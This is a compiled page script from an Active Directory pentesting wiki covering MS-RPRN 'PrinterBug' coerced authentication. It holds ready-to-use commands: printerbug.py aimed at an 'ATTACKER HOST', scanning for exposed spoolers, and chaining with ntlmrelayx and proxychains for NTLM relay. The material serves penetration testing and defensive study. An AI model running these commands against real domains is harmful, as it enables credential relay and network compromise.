import{_ as h,c as p,a5 as n,G as a,w as i,B as o,o as c,j as e,a as r}from"./chunks/framework.B5CpDqM0.js";const v=JSON.parse('{"title":"MS-RPRN abuse (PrinterBug)","description":"","frontmatter":{"authors":"ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/mitm-and-coerced-authentications/ms-rprn.md","filePath":"ad/movement/mitm-and-coerced-authentications/ms-rprn.md","lastUpdated":1724982529000}'),d={name:"ad/movement/mitm-and-coerced-authentications/ms-rprn.md"};function u(g,t,k,b,m,y){const s=o("PluginTabsTab"),l=o("PluginTabs");return c(),p("div",null,[t[4]||(t[4]=n('<h1 id="ms-rprn-abuse-printerbug" tabindex="-1">MS-RPRN abuse (PrinterBug) <a class="header-anchor" href="#ms-rprn-abuse-printerbug" aria-label="Permalink to &quot;MS-RPRN abuse (PrinterBug)&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>Microsoft’s Print Spooler is a service handling the print jobs and other various tasks related to printing. An attacker controling a domain user/computer can, with a specific RPC call, trigger the spooler service of a target running it and make it authenticate to a target of the attacker&#39;s choosing. This flaw is a &quot;won&#39;t fix&quot; and enabled by default on all Windows environments (<a href="https://fr.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/47" target="_blank" rel="noreferrer">more info on the finding</a>).</p><p>The coerced authentications are made over SMB. But MS-RPRN abuse can be combined with <a href="./webclient">WebClient abuse</a> to elicit incoming authentications made over HTTP which heightens <a href="./../ntlm/relay">NTLM relay</a> capabilities.</p><p>The &quot;specific call&quot; mentioned above is the <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code> notification method, which is part of the MS-RPRN protocol. MS-RPRN is Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server.</p><div class="tip custom-block"><p>The attacker needs a foothold on the domain (i.e. compromised account) for this attack to work since the coercion is operated through an RPC call in the SMB <code>\\pipe\\spoolss</code> named pipe through the <code>IPC$</code> share.</p></div><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>Remotely checking if the spooler is available can be done with <a href="https://github.com/vletoux/SpoolerScanner" target="_blank" rel="noreferrer">SpoolerScanner</a> (Powershell) or with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py" target="_blank" rel="noreferrer">rpcdump</a> (Python).</p><p>The spooler service can be triggered with <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py" target="_blank" rel="noreferrer">printerbug</a> or <a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noreferrer">SpoolSample</a> (C#). There are many alternatives available publicly on the Internet.</p>',9)),a(l,null,{default:i(()=>[a(s,{label:"printerbug"},{default:i(()=>t[0]||(t[0]=[e("p",null,"Trigger the spooler service",-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"printerbug.py"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN'/'USER':'PASSWORD'@'TARGET'"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ATTACKER HOST'")])])])],-1)])),_:1}),a(s,{label:"rpcdump"},{default:i(()=>t[1]||(t[1]=[e("p",null,"Check if the spooler service is available",-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"rpcdump.py"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGET "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"|"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," grep"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -A"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 6"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "spoolsv"')])])])],-1)])),_:1}),a(s,{label:"SpoolerScanner"},{default:i(()=>t[2]||(t[2]=[e("p",null,"Check if the spooler service is available",-1),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,"Import-Module .\\Get-SpoolStatus.ps1")]),r(`
`),e("span",{class:"line"},[e("span",null,"ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}")])])])],-1)])),_:1}),a(s,{label:"ntlmrelayx"},{default:i(()=>t[3]||(t[3]=[e("p",null,[r("In the situation where the tester doesn't have any credentials, it is still possible to "),e("a",{href:"./../ntlm/relay"},"relay an authentication"),r(" and trigger the spooler service of a target via a SOCKS proxy.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ntlmrelayx.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb://"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$TARGET "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-socks")]),r(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"proxychains"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," printerbug.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -no-pass"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN'/'USER'@'TARGET'"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ATTACKER HOST'")])])])],-1)])),_:1})]),_:1}),t[5]||(t[5]=n('<div class="tip custom-block"><p><strong>Nota bene</strong>: coerced NTLM authentications made over SMB restrict the possibilites of <a href="./../ntlm/relay">NTLM relay</a>. For instance, an &quot;unsigning cross-protocols relay attack&quot; from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.</p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/" target="_blank" rel="noreferrer">https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/</a></p>',3))])}const C=h(d,[["render",u]]);export{v as __pageData,C as default};
